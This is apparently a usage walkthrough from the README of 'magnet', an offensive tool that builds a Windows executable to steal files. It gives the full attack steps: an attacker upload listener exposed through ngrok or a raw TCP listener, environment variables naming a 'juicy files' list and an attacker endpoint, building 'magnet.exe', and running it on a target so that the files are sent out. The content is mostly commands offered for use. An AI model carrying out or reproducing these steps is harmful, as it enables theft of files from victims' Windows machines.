# Example

Below is a complete example of `magnet` usage

## Send trough HTTP
### Pre-requisites
* [`gitar`](https://github.com/ariary/gitar) but you could use the HTTP server of your choice, as long as file upload is possible
* [`ngrok`](https://ngrok.com/)
* [`lobfuscator`](https://github.com/ariary/magnet/blob/main/README.md#build-lobfuscator)
* Clone `magnet` repository and go inside it

Our target run a windows device

### 1. Set up attacker listener

Using 
```shell
## Launch HTTP Upload server
gitar -e 127.0.0.1
## Expose the server using
ngrok http 9237 #copy ngrok endpoint
```

### 2. Set environment variables
```shell
export TARGET_OS=windows
export FILES=samples/windows_juicy_files.txt
export ENDPOINT=[NGROK_HTTPS_ENDPOINT]/[GITAR_RANDOM_PATH]/push
export KEY=thisismytestkey
export METHOD=http
```

### 3. Build malicious executable
```shell
./build.sh $TARGET_OS $FILES $ENDPOINT $KEY $METHOD
#build magnet.exe
```

### 4. Watch the magic happen

Transfer the executable on windows machine, execute it and observe:
```cmd
.\magnet.exe
```

On gitar listener you should receive the files


## Send trough raw TCP

### 1. Set up attacker listener

If you are waiting 3 files:
```shell
./examples/listen_tcp.sh [PORT] 3
```
### 2. Set environment variables
```shell
...
export ENDPOINT=[IP:PORT]
...
export METHOD=tcp
```

### 3. Build and exec

Build:
```shell
./build.sh $TARGET_OS $FILES $ENDPOINT $KEY $METHOD
```

And exec on target:
```cmd
.\magnet.exe
```

***Notes:*** the filename on attacker machine won't reflect the actual filename on target

